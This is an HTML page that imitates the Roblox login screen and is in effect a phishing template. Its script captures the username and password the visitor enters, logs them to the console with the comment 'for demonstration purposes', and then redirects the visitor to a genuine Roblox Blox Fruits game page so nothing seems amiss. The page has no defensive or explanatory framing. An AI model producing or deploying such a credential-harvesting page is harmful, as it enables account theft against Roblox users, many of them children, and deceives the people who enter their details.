<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background-color: #1b1b1b; 
            color: #ffffff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .login-container {
            width: 320px;
            padding: 20px;
            background-color: #2c2c2c;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
            text-align: center;
        }
        h2 {
            margin-bottom: 20px;
            font-size: 22px;
            font-weight: bold;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background-color: #3a3a3a;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
        .secondary-button {
            background-color: #555;
            margin-top: 10px;
        }
        .secondary-button:hover, button:hover {
            background-color: #6a6a6a;
        }
        .link {
            color: #aaaaaa;
            font-size: 14px;
            margin-top: 20px;
            display: block;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login to Roblox</h2>
        <form id="loginForm" onsubmit="handleLogin(event)">
            <input type="text" id="username" placeholder="Username/Email/Phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
            <button class="secondary-button" type="button">Email Me a One-Time Code</button>
            <button class="secondary-button" type="button">Use Another Device</button>
        </form>
        <a href="#" class="link">Forgot Password or Username?</a>
        <a href="#" class="link">Don't have an account? Sign Up</a>
    </div>

    <script>
        function handleLogin(event) {
            event.preventDefault();

            // Get username and password
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Save username and password to console (for demonstration purposes)
            console.log(`Username: ${username}, Password: ${password}`);

            // Redirect to the Roblox game URL
            window.location.href = "https://www.roblox.com/games/2753915549/Blox-Fruits?gameSearchSessionInfo=70fea467-4874-4bda-8f8d-7120f9de3e13&isAd=false&nativeAdData=&numberOfLoadedTiles=40&page=searchPage&placeId=2753915549&position=0&universeId=994732206";
        }
    </script>
</body>
</html>
